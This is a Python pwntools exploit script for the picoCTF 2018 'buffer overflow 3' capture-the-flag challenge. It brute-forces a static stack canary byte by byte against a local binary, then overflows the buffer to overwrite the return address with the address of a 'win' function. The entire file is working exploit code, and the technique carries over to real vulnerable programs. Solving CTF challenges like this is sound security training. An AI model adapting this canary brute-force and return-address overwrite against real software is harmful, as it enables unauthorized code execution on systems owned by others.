#!/usr/bin/python

# Created for the picoCTF 2018 buffer overflow 3 challenge
# required brute-forcing a static "canary" implementation


from pwn import *
import struct
import itertools
import time

buf = "B" * 32
junk = "D" * 16
#win at 0x080486eb
eip = struct.pack("<I",0x080486eb)

charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&()_"
canary = ""
# get all 4-byte permutations of the charset
print "Calculating permutations..."
guesses = [''.join(i) for i in itertools.permutations(charset, 1)]


print "Brute-forcing first canary byte..."
for guess in guesses:
	p = process("./vuln")
	p.recvuntil(">")
	p.sendline("33")
	p.recvuntil(">")
	p.sendline(buf + str(guess))
	data = p.recv()
	data += p.recv()
	if "Smashing" not in data:
		print "Canary is %s" % guess
		canary += guess
		p.close()
		break
	p.close()

print "Canary so far is %s" % canary
time.sleep(1)
print "Brute-forcing second canary byte..."
for guess in guesses:
	guess = canary + guess
        p = process("./vuln")
        p.recvuntil(">")
        p.sendline("34")
        p.recvuntil(">")
        p.sendline(buf + str(guess))
        data = p.recv()
        data += p.recv()
        if "Smashing" not in data:
                print "Canary's second byte found; canary is %s" % guess
                canary += guess[1]
                p.close()
                break
        p.close()


print "Canary so far is %s" % canary
time.sleep(1)
print "Brute-forcing third canary byte..."
for guess in guesses:
        guess = canary + guess
        p = process("./vuln")
        p.recvuntil(">")
        p.sendline("35")
        p.recvuntil(">")
        p.sendline(buf + str(guess))
        data = p.recv()
        data += p.recv()
        if "Smashing" not in data:
                print "Canary's third byte found; canary is %s" % guess
                canary += guess[2]
                p.close()
                break
        p.close()

print "Canary so far is %s" % canary
time.sleep(1)
print "Brute-forcing fourth canary byte..."
for guess in guesses:
        guess = canary + guess
        p = process("./vuln")
        p.recvuntil(">")
        p.sendline("36")
        p.recvuntil(">")
        p.sendline(buf + str(guess))
        data = p.recv()
        data += p.recv()
        if "Smashing" not in data:
                print "Canary's fourth byte found; canary is %s" % guess
                canary += guess[3]
                p.close()
                break
        p.close()

print "Final canary is %s" % canary

print "Running the exploit..."
#run the final exploit with the canary value
print "The input to use is: "
print buf + canary + junk + eip
p = process("./vuln")
p.recvuntil(">")
p.sendline("500")
p.recvuntil(">")
print p.sendline(buf + canary + junk + eip)
print p.recv()
print p.recv()
print p.recv()
p.close()
